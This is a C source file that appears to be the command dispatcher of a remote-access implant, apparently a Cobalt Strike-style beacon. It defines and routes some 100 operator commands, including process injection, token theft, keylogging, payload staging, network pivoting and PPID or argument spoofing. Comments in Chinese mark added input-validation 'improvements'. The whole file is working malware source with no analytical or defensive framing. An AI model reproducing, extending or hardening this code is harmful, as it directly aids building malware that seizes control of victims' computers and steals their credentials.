#include "channel.h"
#include "commands.h"
#include "security.h"
#include "tomcrypt.h"
#include "beacon.h"
#include "link.h"
#include "build.h"
#include "parse.h"
#include "bformat.h"

// 改进：添加更多常量定义
#define MAX_COMMANDS 0x66
#define MAX_PAYLOAD_SIZE (1024 * 1024)  // 1MB限制
#define MIN_HEADER_SIZE sizeof(header)

#define COMMAND_SPAWN          0x01
#define COMMAND_SHELL          0x02
#define COMMAND_DIE            0x03
#define COMMAND_SLEEP          0x04
#define COMMAND_CD             0x05
#define COMMAND_KEYLOG_START   0x06
#define COMMAND_KEYLOG_STOP    0x07
#define COMMAND_KEYLOG_DUMP    0x08
#define COMMAND_INJECT_PID     0x09
#define COMMAND_UPLOAD         0x0A
#define COMMAND_DOWNLOAD       0x0B
#define COMMAND_EXECUTE        0x0C
#define COMMAND_SPAWN_PROC_X86 0x0D
#define COMMAND_CONNECT        0x0E
#define COMMAND_SEND           0x0F
#define COMMAND_CLOSE          0x10
#define COMMAND_LISTEN         0x11
#define COMMAND_INJECT_PING    0x12
#define COMMAND_DOWNLOAD_STOP  0x13
#define COMMAND_CHANNEL_SMB    0x14
#define COMMAND_PIPE_OPEN      0x15
#define COMMAND_PIPE_ROUTE     0x16
#define COMMAND_PIPE_CLOSE     0x17
#define COMMAND_PIPE_REOPEN    0x18
#define COMMAND_GETSYSTEM      0x19
#define COMMAND_BYPASSUAC      0x1A
#define COMMAND_TOKEN_GETUID   0x1B
#define COMMAND_TOKEN_REV2SELF 0x1C
#define COMMAND_TIMESTOMP      0x1D
#define COMMAND_DEPRECATE_D    0x1E
#define COMMAND_STEAL_TOKEN    0x1F
#define COMMAND_PS_LIST        0x20
#define COMMAND_PS_KILL        0x21
#define COMMAND_KERB_TKT_USE   0x22
#define COMMAND_KERB_TKT_PURGE 0x23
#define COMMAND_PSH_RUN        0x24
#define COMMAND_PSH_IMPORT     0x25
#define COMMAND_RUNAS          0x26
#define COMMAND_PWD            0x27
#define COMMAND_JOB_REGISTER   0x28
#define COMMAND_JOBS           0x29
#define COMMAND_JOB_KILL       0x2a
#define COMMAND_INJECTX64_PID  0x2b
#define COMMAND_SPAWNX64       0x2c
#define COMMAND_INJECT_PID_PING    0x2d
#define COMMAND_INJECTX64_PID_PING 0x2e
#define COMMAND_PAUSE              0x2f
#define COMMAND_IPCONFIG           0x30
#define COMMAND_LOGINUSER          0x31
#define COMMAND_LSOCKET_BIND	   0x32
#define COMMAND_LSOCKET_CLOSE      0x33
#define COMMAND_STAGE_PAYLOAD      0x34
#define COMMAND_FILE_LIST          0x35
#define COMMAND_FILE_MKDIR         0x36
#define COMMAND_FILE_DRIVES        0x37
#define COMMAND_FILE_RM            0x38
#define COMMAND_STAGE_PAYLOAD_SMB  0x39
#define COMMAND_PSEXEC_COMMAND     0x3a
#define COMMAND_WEBSERVER_LOCAL    0x3b
#define COMMAND_ELEVATE_PRE        0x3c
#define COMMAND_ELEVATE_POST       0x3d
#define COMMAND_JOB_REGISTER_IMPERSONATE 0x3e
#define COMMAND_SPAWN_POWERSHELLX86  0x3f
#define COMMAND_SPAWN_POWERSHELLX64  0x40
#define COMMAND_INJECT_POWERSHELLX86_PID 0x41
#define COMMAND_INJECT_POWERSHELLX64_PID 0x42
#define COMMAND_UPLOAD_CONTINUE		0x43
#define COMMAND_PIPE_OPEN_EXPLICIT  0x44
#define COMMAND_SPAWN_PROC_X64      0x45
#define COMMAND_JOB_SPAWN_X86       0x46
#define COMMAND_JOB_SPAWN_X64       0x47
#define COMMAND_SETENV              0x48
#define COMMAND_FILE_COPY           0x49
#define COMMAND_FILE_MOVE           0x4a
#define COMMAND_PPID                0x4b
#define COMMAND_RUN_UNDER_PID       0x4c
#define COMMAND_GETPRIVS            0x4d
#define COMMAND_EXECUTE_JOB         0x4e
#define COMMAND_PSH_HOST_TCP        0x4f
#define COMMAND_DLL_LOAD            0x50
#define COMMAND_REG_QUERY           0x51
#define COMMAND_LSOCKET_TCPPIVOT    0x52
#define COMMAND_ARGUE_ADD           0x53
#define COMMAND_ARGUE_REMOVE        0x54
#define COMMAND_ARGUE_LIST          0x55
#define COMMAND_TCP_CONNECT         0x56
#define COMMAND_JOB_SPAWN_TOKEN_X86 0x57
#define COMMAND_JOB_SPAWN_TOKEN_X64 0x58
#define COMMAND_SPAWN_TOKEN_X86     0x59
#define COMMAND_SPAWN_TOKEN_X64     0x5a
#define COMMAND_INJECTX64_PING      0x5b
#define COMMAND_BLOCKDLLS           0x5c
#define COMMAND_SPAWNAS_X86         0x5d
#define COMMAND_SPAWNAS_X64         0x5e
#define COMMAND_INLINE_EXECUTE      0x5f
#define COMMAND_ELEVATE_RUN_INJ_X86 0x60
#define COMMAND_ELEVATE_RUN_INJ_X64 0x61
#define COMMAND_SPAWNU_X86          0x62
#define COMMAND_SPAWNU_X64          0x63
#define COMMAND_INLINE_EXECUTE_OBJECT 0x64
#define COMMAND_JOB_REGISTER_MSGMODE 0x65
#define COMMAND_LSOCKET_BIND_LOCALHOST 0x66

typedef struct {
    unsigned int   type;
    unsigned int   size;
} header;

// 改进：添加命令验证函数
BOOL is_valid_command(unsigned int type) {
    return (type >= COMMAND_SPAWN && type <= COMMAND_LSOCKET_BIND_LOCALHOST);
}

// 改进：添加消息大小验证函数
BOOL is_valid_message_size(unsigned int size) {
    return (size > 0 && size <= MAX_PAYLOAD_SIZE);
}

void process_message(unsigned int type, char * buffer, int length) {
    // 改进：添加输入验证
    if (buffer == NULL || length <= 0) {
        return;
    }

    // 改进：验证命令类型
    if (!is_valid_command(type)) {
        // dlog("Invalid command type: 0x%x\n", type);
        return;
    }

    // 改进：验证消息大小
    if (!is_valid_message_size(length)) {
        // dlog("Invalid message size: %d\n", length);
        return;
    }

    switch (type) {
    case COMMAND_SPAWN:
        command_inject(buffer, length, TRUE, TRUE);
        break;
    case COMMAND_INJECT_PID:
        command_inject_pid(buffer, length, TRUE);
        break;
    case COMMAND_SHELL:
        /* deprecated */
        break;
    case COMMAND_DIE:
        command_die(command_shell_callback);
        break;
    case COMMAND_SLEEP:
        command_sleep(buffer, length);
        break;
    case COMMAND_CD:
        command_cd(buffer, length);
        break;
    case COMMAND_KEYLOG_START:
        /* deprecated */
        break;
    case COMMAND_KEYLOG_STOP:
        /* deprecated */
        break;
    case COMMAND_UPLOAD:
        command_upload(buffer, length, "wb");
        break;
    case COMMAND_DOWNLOAD:
        command_download(buffer, length, command_shell_callback);
        break;
    case COMMAND_EXECUTE:
        command_execute(buffer, length);
        break;
    case COMMAND_SPAWN_PROC_X86:
        command_spawnproc(buffer, length, TRUE);
        break;
    case COMMAND_CONNECT:
        command_connect(buffer, length, command_shell_callback);
        break;
    case COMMAND_SEND:
        command_send(buffer, length);
        break;
    case COMMAND_CLOSE:
        command_close(buffer, length);
        break;
    case COMMAND_LISTEN:
        command_listen(buffer, length, command_shell_callback);
        break;
    case COMMAND_INJECT_PING:
        command_inject_ping(buffer, length, TRUE, command_shell_callback);
        break;
    case COMMAND_DOWNLOAD_STOP:
        command_download_stop(buffer, length);
        break;
    case COMMAND_CHANNEL_SMB:
        /* deprecated */
        break;
    case COMMAND_PIPE_OPEN:
        /* deprecated */
        break;
    case COMMAND_PIPE_ROUTE:
        command_link_route(buffer, length, command_shell_callback);
        break;
    case COMMAND_PIPE_CLOSE:
        command_link_stop(buffer, length, command_shell_callback);
        break;
    case COMMAND_PIPE_REOPEN:
        command_link_reopen(buffer, length, command_shell_callback);
        break;
    case COMMAND_TOKEN_GETUID:
        command_getuid(buffer, length, command_shell_callback);
        break;
    case COMMAND_TOKEN_REV2SELF:
        command_rev2self();
        break;
    case COMMAND_STEAL_TOKEN:
        command_steal_token(buffer, length, command_shell_callback);
        break;
    case COMMAND_GETSYSTEM:
        /* deprecated */
        break;
    case COMMAND_BYPASSUAC:
        /* deprecated */
        break;
    case COMMAND_TIMESTOMP:
        /* deprecated 4.1 */
        break;
    case COMMAND_PS_LIST:
        command_ps_list(buffer, length, command_shell_callback);
        break;
    case COMMAND_PS_KILL:
        command_ps_kill(buffer, length);
        break;
    case COMMAND_KERB_TKT_USE:
        /* deprecated */
        break;
    case COMMAND_KERB_TKT_PURGE:
        /* deprecated */
        break;
    case COMMAND_PSH_RUN:
        /* deprecated */
        break;
    case COMMAND_PSH_IMPORT:
        command_psh_import(buffer, length);
        break;
    case COMMAND_RUNAS:
        command_runas(buffer, length, command_shell_callback);
        break;
    case COMMAND_PWD:
        command_pwd(command_shell_callback);
        break;
    case COMMAND_JOB_REGISTER:
        command_job_register(buffer, length, FALSE, JOB_MODE_BYTE);
        break;
    case COMMAND_JOBS:
        command_jobs(command_shell_callback);
        break;
    case COMMAND_JOB_KILL:
        command_job_kill(buffer, length);
        break;
    case COMMAND_INJECTX64_PID:
        command_inject_pid(buffer, length, FALSE);
        break;
    case COMMAND_SPAWNX64:
        command_inject(buffer, length, FALSE, TRUE);
        break;
    case COMMAND_INJECT_PID_PING:
        command_inject_pid_ping(buffer, length, command_shell_callback, TRUE);
        break;
    case COMMAND_INJECTX64_PID_PING:
        command_inject_pid_ping(buffer, length, command_shell_callback, FALSE);
        break;
    case COMMAND_PAUSE:
        command_pause(buffer, length);
        break;
    case COMMAND_IPCONFIG:
        /* deprecated 4.2 */
        break;
    case COMMAND_LOGINUSER:
        command_loginuser(buffer, length, command_shell_callback);
        break;
    case COMMAND_LSOCKET_BIND:
        command_socket_bind(buffer, length, INADDR_ANY);
        break;
    case COMMAND_LSOCKET_CLOSE:
        command_socket_close(buffer, length);
        break;
    case COMMAND_STAGE_PAYLOAD:
        command_stage_payload(buffer, length);
        break;
    case COMMAND_FILE_LIST:
        command_file_list(buffer, length, command_shell_callback);
        break;
    case COMMAND_FILE_MKDIR:
        command_file_mkdir(buffer, length);
        break;
    case COMMAND_FILE_DRIVES:
        command_file_drives(buffer, length, command_shell_callback);
        break;
    case COMMAND_FILE_RM:
        command_file_delete(buffer, length);
        break;
    case COMMAND_STAGE_PAYLOAD_SMB:
        command_stage_payload_smb(buffer, length);
        break;
    case COMMAND_PSEXEC_COMMAND:
        /* deprecated 4.1 */
        break;
    case COMMAND_WEBSERVER_LOCAL:
        command_webserver_local(buffer, length);
        break;
    case COMMAND_ELEVATE_PRE:
        command_elevate_pre(buffer, length);
        break;
    case COMMAND_ELEVATE_POST:
        command_elevate_post(command_shell_callback);
        break;
    case COMMAND_JOB_REGISTER_IMPERSONATE:
        command_job_register(buffer, length, TRUE, JOB_MODE_BYTE);
        break;
    case COMMAND_SPAWN_POWERSHELLX86:
        /* deprecated */
        break;
    case COMMAND_SPAWN_POWERSHELLX64:
        /* deprecated */
        break;
    case COMMAND_INJECT_POWERSHELLX86_PID:
        /* deprecated */
        break;
    case COMMAND_INJECT_POWERSHELLX64_PID:
        /* deprecated */
        break;
    case COMMAND_UPLOAD_CONTINUE:
        command_upload(buffer, length, "ab");
        break;
    case COMMAND_PIPE_OPEN_EXPLICIT:
        command_link_start_explicit(buffer, length, command_shell_callback);
        break;
    case COMMAND_SPAWN_PROC_X64:
        command_spawnproc(buffer, length, FALSE);
        break;
    case COMMAND_JOB_SPAWN_X86:
        command_job_spawn(buffer, length, TRUE, TRUE);
        break;
    case COMMAND_JOB_SPAWN_X64:
        command_job_spawn(buffer, length, FALSE, TRUE);
        break;
    case COMMAND_SETENV:
        command_setenv(buffer, length);
        break;
    case COMMAND_FILE_COPY:
        command_file_copy(buffer, length);
        break;
    case COMMAND_FILE_MOVE:
        command_file_move(buffer, length);
        break;
    case COMMAND_PPID:
        command_ppid(buffer, length);
        break;
    case COMMAND_RUN_UNDER_PID:
        command_runu(buffer, length);
        break;
    case COMMAND_GETPRIVS:
        command_getprivs(buffer, length, command_shell_callback);
        break;
    case COMMAND_EXECUTE_JOB:
        command_execjob(buffer, length);
        break;
    case COMMAND_PSH_HOST_TCP:
        command_psh_host_tcp(buffer, length);
        break;
    case COMMAND_DLL_LOAD:
        /* deprecated 4.1 */
        break;
    case COMMAND_REG_QUERY:
        /* deprecated 4.1 */
        break;
    case COMMAND_LSOCKET_TCPPIVOT:
        command_socket_tcppivot(buffer, length);
        break;
    case COMMAND_ARGUE_ADD:
        command_argue_add(buffer, length);
        break;
    case COMMAND_ARGUE_REMOVE:
        command_argue_remove(buffer, length);
        break;
    case COMMAND_ARGUE_LIST:
        command_argue_list(command_shell_callback);
        break;
    case COMMAND_TCP_CONNECT:
        command_tcp_connect(buffer, length, command_shell_callback);
        break;
    case COMMAND_JOB_SPAWN_TOKEN_X86:
        command_job_spawn(buffer, length, TRUE, FALSE);
        break;
    case COMMAND_JOB_SPAWN_TOKEN_X64:
        command_job_spawn(buffer, length, FALSE, FALSE);
        break;
    case COMMAND_SPAWN_TOKEN_X86:
        command_inject(buffer, length, TRUE, FALSE);
        break;
    case COMMAND_SPAWN_TOKEN_X64:
        command_inject(buffer, length, FALSE, FALSE);
        break;
    case COMMAND_INJECTX64_PING:
        command_inject_ping(buffer, length, FALSE, command_shell_callback);
        break;
    case COMMAND_BLOCKDLLS:
        command_blockdlls(buffer, length);
        break;
    case COMMAND_SPAWNAS_X86:
        command_spawnas(buffer, length, TRUE);
        break;
    case COMMAND_SPAWNAS_X64:
        command_spawnas(buffer, length, FALSE);
        break;
    case COMMAND_INLINE_EXECUTE:
        /* deprecated in 4.1 */
        break;
    case COMMAND_ELEVATE_RUN_INJ_X86:
        /* deprecated in 4.1 */
        break;
    case COMMAND_ELEVATE_RUN_INJ_X64:
        /* deprecated in 4.1 */
        break;
    case COMMAND_SPAWNU_X86:
        command_spawnu(buffer, length, TRUE);
        break;
    case COMMAND_SPAWNU_X64:
        command_spawnu(buffer, length, FALSE);
        break;
    case COMMAND_INLINE_EXECUTE_OBJECT:
        command_inline_execute_object(buffer, length);
        break;
    case COMMAND_JOB_REGISTER_MSGMODE:
        command_job_register(buffer, length, FALSE, JOB_MODE_MESSAGE);
        break;
    case COMMAND_LSOCKET_BIND_LOCALHOST:
        command_socket_bind(buffer, length, 0x0100007f);
        break;
    default:
        // 改进：处理未知命令类型
        // dlog("Unknown command type: 0x%x\n", type);
        break;
    }
}

/* process through the buffer... extract the length, type, and value */
void process_payload(char * buffer, unsigned int length) {
    header h = {0};
    unsigned int pos = 0;
    unsigned int remaining_bytes = 0;

    // 改进：添加输入验证
    if (buffer == NULL || length == 0) {
        return;
    }

    // 改进：添加最大长度检查
    if (length > MAX_PAYLOAD_SIZE) {
        // dlog("Payload too large: %u bytes\n", length);
        return;
    }

    while (pos < length) {
        remaining_bytes = length - pos;
        
        // 改进：确保有足够的字节读取头部
        if (remaining_bytes < MIN_HEADER_SIZE) {
            // dlog("Insufficient bytes for header at pos %u\n", pos);
            break;
        }

        // 改进：安全的内存复制
        memcpy((void *)&h, buffer + pos, MIN_HEADER_SIZE);

        /* fix the endian values */
        h.type = ntohl(h.type);
        h.size = ntohl(h.size);

        // 改进：更全面的数据完整性检查
        if (h.size == 0) {
            // dlog("Zero size message at pos %u\n", pos);
            pos += MIN_HEADER_SIZE;
            continue;
        }

        if (h.size > MAX_PAYLOAD_SIZE) {
            // dlog("Message size too large: %u at pos %u\n", h.size, pos);
            break;
        }

        /* sanity check our data */
        if ((pos + h.size + MIN_HEADER_SIZE) > length) {
            // dlog("Corrupt size: pos:%u size:%u len:%u\n", pos, h.size, length);
            break;
        }

        // 改进：确保有足够的字节读取消息体
        if (remaining_bytes < (MIN_HEADER_SIZE + h.size)) {
            // dlog("Insufficient bytes for message body at pos %u\n", pos);
            break;
        }

        /* process our message */
        // dlog("Process Message: %u t: 0x%x h:%u\n", h.size, h.type, MIN_HEADER_SIZE);
        process_message(h.type, buffer + pos + MIN_HEADER_SIZE, h.size);

        /* on to the next message please */
        pos += h.size + MIN_HEADER_SIZE;

        // 改进：防止整数溢出
        if (pos < (h.size + MIN_HEADER_SIZE)) {
            // dlog("Integer overflow detected\n");
            break;
        }
    }

    /* cleanup the data we just processed */
    if (buffer != NULL && length > 0) {
        memset(buffer, 0, length);
    }
}
